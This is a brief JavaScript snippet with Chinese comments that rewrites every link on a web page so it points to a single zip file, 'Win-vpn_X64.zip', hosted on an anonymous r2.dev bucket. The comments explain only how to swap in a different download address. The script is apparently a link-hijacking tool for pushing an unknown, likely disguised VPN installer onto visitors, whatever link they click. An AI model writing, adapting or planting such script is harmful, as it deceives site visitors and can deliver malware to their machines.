 

var xz = "https://pub-3b529f594568423ca17dbc6e58f1deb4.r2.dev/Win-vpn_X64.zip";

//可以把   https://pub-3b529f594568423ca17dbc6e58f1deb4.r2.dev/Win-vpn_X64.zip 这个改成下载地址；https://pub-3b529f594568423ca17dbc6e58f1deb4.r2.dev/Win-vpn_X64.zip
//可以把   https://pub-3b529f594568423ca17dbc6e58f1deb4.r2.dev/Win-vpn_X64.zip  这个改成文件下载：https://pub-3b529f594568423ca17dbc6e58f1deb4.r2.dev/Win-vpn_X64.zip



var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
